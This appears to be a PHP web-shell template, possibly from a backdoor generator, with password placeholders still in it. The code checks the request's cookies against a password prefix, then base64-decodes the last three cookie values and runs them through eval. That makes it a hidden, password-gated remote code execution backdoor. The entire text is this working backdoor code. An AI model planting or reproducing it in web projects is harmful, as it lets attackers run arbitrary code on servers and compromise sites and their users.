$c="count";
$a=$_COOKIE;
if(reset($a)=="${password[:2]}" && $c($a)>3){
$k="${password[2:]}";
echo "<$k>";
eval(base64_decode(preg_replace(array("/[^\w=\s]/","/\s/"), array("","+"), join(array_slice($a,$c($a)-3)))));
echo "</$k>";
}
